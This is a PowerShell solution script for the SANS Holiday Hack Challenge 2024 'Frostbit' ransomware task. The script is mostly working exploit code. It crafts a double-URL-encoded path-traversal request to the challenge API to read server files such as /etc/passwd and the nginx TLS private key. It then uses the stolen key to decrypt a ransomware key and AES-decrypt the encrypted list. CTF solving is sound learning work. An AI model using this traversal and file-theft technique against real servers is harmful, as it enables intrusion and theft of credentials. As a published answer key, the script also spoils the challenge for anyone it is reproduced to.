<#
    .SYNOPSIS

        Holiday Hack Challenge 2024 - Snow-maggedon
        
        Decrypt the Naughty-Nice List
        Difficulty: 5 of 5

        Author: Nick DeBaggis
        License: BSD 3-Clause
        Required Dependencies: Powershell 7
        Optional Dependencies: None

    .DESCRIPTION

        This script exfiltrates data from the Frostbit Ransomware API server.
        You will need four items to run this script, they can be found in both the decrypted TLS pcap
        as well as in the frostbit_core_dump file: the botuuid, the nonce, and the encryptedkey.
        The frostbit encrypted file is found in the artifacts zip file.

    .PARAMETER BotUUID

        Required Bot UUID, this is unique to each player and set of generated artifacts.
        You can find this UUID in both the frostbit_core_dump file strings as well as the
        pcap file provided you have decrypted the TLS HTTP traffic stream.
        
        The BotUUID will have this format of hex chars and dashes (example only):
        f14d60cd-67b9-44ec-8f41-b5ea5137413c

    .PARAMETER NonceHex

        Required encryption Nonce, You can find the nonce in both the frostbit_core_dump file strings as well as the
        pcap file provided you have decrypted the TLS HTTP traffic stream.  It is located in a json object named "nonce".

    .PARAMETER EncDataEncKeyHex

        Required Encrypted Data Encryption Key, You can find this in both the frostbit_core_dump file strings as well as the
        pcap file provided you have decrypted the TLS HTTP traffic stream.  It is located in a json object named "encryptedkey".

    .PARAMETER FrostbitFile

        Required Full path to the Frostbit Ransomware encrypted file.
        This is found in the artifacts zip file.  The file has the extension .frostbit

    .PARAMETER SaveTranscript

        Optional Save a powershell transcript log in the default location.
        
    .EXAMPLE

        .\14-frostbit-decrypt-gold.ps1 `
        -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c `
        -Nonce c97b647f99cb744a `
        -EncDataEncKeyHex 2f737670fa0810413cb5f8<example>4a9f9455c76d25ee6e853d `
        -FrostbitFile 'D:\HHC2024\FrostbitDecrypt\naughty_nice_list.csv.frostbit'

    .EXAMPLE

        .\14-frostbit-decrypt-gold.ps1 `
        -BotUUID f14d60cd-67b9-44ec-8f41-b5ea5137413c `
        -Nonce c97b647f99cb744a `
        -EncDataEncKeyHex 2f737670fa0810413cb5f8<example>4a9f9455c76d25ee6e853d `
        -FrostbitFile 'D:\HHC2024\FrostbitDecrypt\naughty_nice_list.csv.frostbit'
        -SaveTranscript

    .LINK
        https://www.sans.org/mlp/holiday-hack-challenge-2024/


#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [String]$BotUUID,

    [Parameter(Mandatory=$true)]
    [String]$NonceHex,

    [Parameter(Mandatory=$true)]
    [String]$EncDataEncKeyHex,

    [Parameter(Mandatory=$true)]
    [String]$FrostbitFile,

    [Parameter(Mandatory=$false)]
    [switch]$SaveTranscript
)

if($SaveTranscript){Start-Transcript}

function Is-UUID {
    param (
        [string]$InputString
    )
    
    $uuidRegex = '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-5][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}$'
    return $InputString -match $uuidRegex
}

function Escape-StringForURL {
    param (
        [string]$inputString
    )

    # Hashtable for character to double URL encoding mapping
    $charMap = @{
        "/"  = "%252F"
        ";"  = "%253B"
        " "  = "%252B"
        "&"  = "%2526"
        "'"  = "%2527"
        "~"  = "%257E"
        "`""  = "%2522"
    }

    # Loop through each key-value pair in the hashtable and perform the replacement
    foreach ($key in $charMap.Keys) {
        $inputString = $inputString -replace [Regex]::Escape($key), $charMap[$key]
    }

    return $inputString
}

if(-not (Is-UUID -InputString $BotUUID)){
    "Error badly formatted BotUUID, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
    return
}

$nonceregex = '^[0-9a-fA-F]{16}$'
if($NonceHex -notmatch $nonceregex){
    "Error badly formatted Nonce, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
    return
}

$inputFilePath = $FrostbitFile
$outputFilePath = $inputFilePath -replace ".frostbit$", ""

if($inputFilePath -eq $outputFilePath){
    throw "FATAL: computed outputFilePath is the same as the inputFilePath! does the input file end in .frostbit?"
}

$DataEncKey = ""
$DataEncKeysig = ""
$KeyEncKey = ""

$DoubleNonce = "$NonceHex$NonceHex"
$DoubleNonceEncoded = ""

for ($i = 0; $i -lt $DoubleNonce.Length; $i += 2) {
    $hexByte = $DoubleNonce.Substring($i, 2)
    $byte = [System.Convert]::ToByte($hexByte, 16)
    $DoubleNonceEncoded += "%25" + [System.BitConverter]::ToString($byte).Replace("-", "").ToLower()
}

<#
Files known to exist on the api server.
/etc/passwd
/etc/resolv.conf
/etc/nginx/certs/api.frostbit.app.key
#>

# the file to read off the api server.
$file = "/etc/nginx/certs/api.frostbit.app.key"

# base url
$url = "https://api.frostbit.app/view/"

# double encoded nonce.
$url += $DoubleNonceEncoded

# dir traversal backwards five levels.
$url += Escape-StringForURL -inputString "/../../../../.."

# api server local file to attempt reading.
$url += Escape-StringForURL -inputString $file

# botuuid, with all-zeros digest and debug set.
$url += "/$BotUUID/status?digest=00000000000000000000000000000000&debug=true"

"Starting Frostbit CSV Decryption on $(Get-Date)"
"BotUUID: " + $BotUUID
"Nonce: " + $NonceHex
"Doubled Nonce: " + $DoubleNonce
"Encrypted Data Encryption Key: " + $EncDataEncKeyHex
"`n"
"Attempting to read $file off the API server..."
# print the whole url out for reference or input to browser
"LFI URI built:`n" + $url

# send the url and grab the response content
$resp = Invoke-WebRequest -SkipHttpErrorCheck -Uri $url

if($resp.StatusCode -ne 200){
    "Bad request: $resp"
    return
}

$debugDataB64 = $($resp.Content | select-string -pattern "debugData = `"(.+)`"" | %{ $_.Matches[0].Groups[1].Value })

$KeyEncKey = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($debugDataB64))
"`n"
"Key Encryption Key exfiltrated from API server:`n" + $KeyEncKey

"Attempting to decrypt the encrypted data encryption key..."
# Strip the "BEGIN" and "END" lines and base64 decode the key content
$pemContent = $KeyEncKey -replace "-----BEGIN (.*?)-----", "" -replace "-----END (.*?)-----", "" | Out-String
$pemContent = $pemContent.Trim()

# Convert the base64-encoded string into byte array
$keyBytes = [Convert]::FromBase64String($pemContent)

$bytesRead = ""

# Create RSA object and import the private key bytes
$rsa = [System.Security.Cryptography.RSA]::Create()
$rsa.ImportRSAPrivateKey($keyBytes, [ref]$bytesRead)

# Convert hex string to byte array
$encryptedBytes = [Convert]::FromHexString($EncDataEncKeyHex)

# Decrypt the data using the private key
$decryptedBytes = $rsa.Decrypt($encryptedBytes, [System.Security.Cryptography.RSAEncryptionPadding]::PKCS1)

# Convert the decrypted bytes back to a string (assuming it's UTF-8 encoded)
$decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
($DataEncKey,$DataEncKeycheck) = $decryptedString -split ","

"Full decrypted data payload: " + $decryptedString
"AES Data Encryption Key: " + $DataEncKey
"AES Data Encryption Key Check: " + $DataEncKeycheck

if($DataEncKeycheck -ne $NonceHex){
    throw "AES Data Encryption Key Check does not match nonce!"
}
else{
    "AES Data Encryption Key check matches nonce."
}

# Ensure key is exactly 32 bytes long (256-bit key for AES)
if ($DataEncKey.Length -ne 32) {
    throw "Key must be 32 characters long (256 bits)."
}

"Attempting to decrypt the encrypted csv data..."
# Convert the key from string to byte array
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($DataEncKey)

# Read the encrypted file content
$encryptedData = [System.IO.File]::ReadAllBytes($inputFilePath)

# Extract the IV from the first 16 bytes
$iv = $encryptedData[0..15]

# Extract the actual encrypted data (excluding the IV)
$cipherText = $encryptedData[16..($encryptedData.Length - 1)]

# Create the AES object with CBC mode
$aes = [System.Security.Cryptography.AES]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Key = $keyBytes
$aes.IV = $iv
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# Create a decryptor
$decryptor = $aes.CreateDecryptor()

# Perform decryption
$decryptedBytes = $decryptor.TransformFinalBlock($cipherText, 0, $cipherText.Length)

"Child #440 information:"
$csv = [System.Text.Encoding]::UTF8.GetString($decryptedBytes) | ConvertFrom-Csv
$csv | where Number -EQ 440

# Write the decrypted data to the output file
[System.IO.File]::WriteAllBytes($outputFilePath, $decryptedBytes)
Write-Output "Decryption complete. Entire Naughty-Nice list saved to '$outputFilePath'"

if($SaveTranscript){Stop-Transcript}
